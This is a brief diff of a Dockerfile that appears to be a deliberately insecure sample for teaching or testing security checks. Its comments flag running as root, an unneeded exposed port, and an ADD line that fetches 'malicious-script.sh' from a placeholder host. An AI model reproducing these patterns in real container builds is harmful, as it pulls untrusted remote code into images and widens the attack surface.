@@ -8,7 +8,7 @@ USER root
 RUN apt-get update && apt-get install curl wget
 
 # Exposing an unnecessary port
-EXPOSE 1234
+EXPOSE 123
 
 # Using ADD to fetch a remote file, which is discouraged
 ADD https://example.com/malicious-script.sh /tmp/malicious-script.sh
